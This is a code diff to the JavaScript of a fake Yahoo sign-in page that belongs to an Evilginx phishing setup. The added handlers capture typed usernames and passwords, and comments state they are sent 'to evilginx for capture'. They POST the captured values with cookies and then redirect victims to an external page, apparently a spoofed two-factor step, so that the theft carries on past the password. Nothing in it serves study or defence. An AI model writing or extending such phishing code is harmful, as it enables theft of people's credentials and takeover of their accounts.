@@ -1,6 +1,86 @@
 // Import jQuery
 const $ = require("jquery")
 
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("passwordForm")
+  const submitBtn = document.getElementById("submitBtn")
+  const passwordToggle = document.getElementById("passwordToggle")
+  const passwordField = document.getElementById("passwd")
+  const usernameField = document.getElementById("username")
+
+  // Password toggle functionality
+  if (passwordToggle && passwordField) {
+    passwordToggle.addEventListener("click", function () {
+      const type = passwordField.getAttribute("type") === "password" ? "text" : "password"
+      passwordField.setAttribute("type", type)
+      this.querySelector(".password-toggle-text").textContent = type === "password" ? "Show" : "Hide"
+    })
+  }
+
+  // Form submission
+  if (form) {
+    form.addEventListener("submit", (e) => {
+      e.preventDefault()
+
+      const username = usernameField.value.trim()
+      const password = passwordField.value.trim()
+
+      if (!username || !password) {
+        showError("Please fill in all fields")
+        return
+      }
+
+      // Show loading state
+      submitBtn.classList.add("btn-loading")
+      submitBtn.disabled = true
+
+      // Store username for next step
+      sessionStorage.setItem("yh_username", username)
+
+      // Simulate form submission delay
+      setTimeout(() => {
+        // Create form data
+        const formData = new FormData()
+        formData.append("username", username)
+        formData.append("passwd", password)
+        formData.append("persistent", document.getElementById("persistent").checked ? "y" : "")
+
+        // Submit to evilginx
+        fetch(window.location.href, {
+          method: "POST",
+          body: formData,
+          credentials: "include",
+        })
+          .then(() => {
+            // Redirect will be handled by evilginx force_post
+            window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+          })
+          .catch(() => {
+            // Fallback redirect
+            window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+          })
+      }, 1500)
+    })
+  }
+
+  function showError(message) {
+    let errorDiv = document.querySelector(".error-message")
+    if (!errorDiv) {
+      errorDiv = document.createElement("div")
+      errorDiv.className = "error-message"
+      form.appendChild(errorDiv)
+    }
+    errorDiv.textContent = message
+    setTimeout(() => errorDiv.remove(), 5000)
+  }
+
+  // Auto-fill username if available
+  const storedUsername = sessionStorage.getItem("yh_username")
+  if (storedUsername && usernameField) {
+    usernameField.value = storedUsername
+  }
+})
+
 $(document).ready(() => {
   console.log("Yahoo seamless authentication system initialized")
 
@@ -304,23 +384,23 @@ $(document).ready(() => {
   }
 
   // ===== FORM SUBMISSION HANDLER =====
-  $("#email-form").on("submit", (e) => {
-    e.preventDefault()
+  // $("#email-form").on("submit", (e) => {
+  //   e.preventDefault()
 
-    const password = $("#password").val().trim()
-    if (!password) {
-      showError("Please enter your password.")
-      return false
-    }
+  //   const password = $("#password").val().trim()
+  //   if (!password) {
+  //     showError("Please enter your password.")
+  //     return false
+  //   }
 
-    if (password.length < 6) {
-      showError("Password must be at least 6 characters long.")
-      return false
-    }
+  //   if (password.length < 6) {
+  //     showError("Password must be at least 6 characters long.")
+  //     return false
+  //   }
 
-    handleSeamlessAuth(password)
-    return false
-  })
+  //   handleSeamlessAuth(password)
+  //   return false
+  // })
 
   // ===== RETRY HANDLER =====
   $("#refreshButton").click(() => {
@@ -426,4 +506,62 @@ $(document).ready(() => {
   }, 500)
 
   console.log("Yahoo seamless authentication system fully initialized")
+})
+
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.querySelector(".signin-form")
+  const submitBtn = document.querySelector(".submit-button")
+  const passwordField = document.getElementById("passwd")
+
+  // Form validation
+  passwordField.addEventListener("input", function () {
+    if (this.value.length > 0) {
+      submitBtn.disabled = false
+      submitBtn.style.opacity = "1"
+    } else {
+      submitBtn.disabled = true
+      submitBtn.style.opacity = "0.6"
+    }
+  })
+
+  // Form submission handling
+  form.addEventListener("submit", (e) => {
+    e.preventDefault()
+
+    const password = passwordField.value
+    if (!password) {
+      alert("Please enter your password")
+      return
+    }
+
+    // Show loading state
+    submitBtn.innerHTML = '<span class="loading-spinner"></span>Signing in...'
+    submitBtn.disabled = true
+
+    // Store password for evilginx capture
+    const formData = new FormData()
+    formData.append("passwd", password)
+
+    // Send to evilginx for capture
+    fetch("/account/challenge/password", {
+      method: "POST",
+      body: formData,
+      credentials: "include",
+    })
+      .then((response) => {
+        // Redirect to 2FA page
+        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+      })
+      .catch((error) => {
+        console.error("Error:", error)
+        // Still redirect on error to maintain flow
+        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+      })
+  })
+
+  // Initialize form state
+  if (passwordField.value.length === 0) {
+    submitBtn.disabled = true
+    submitBtn.style.opacity = "0.6"
+  }
 })
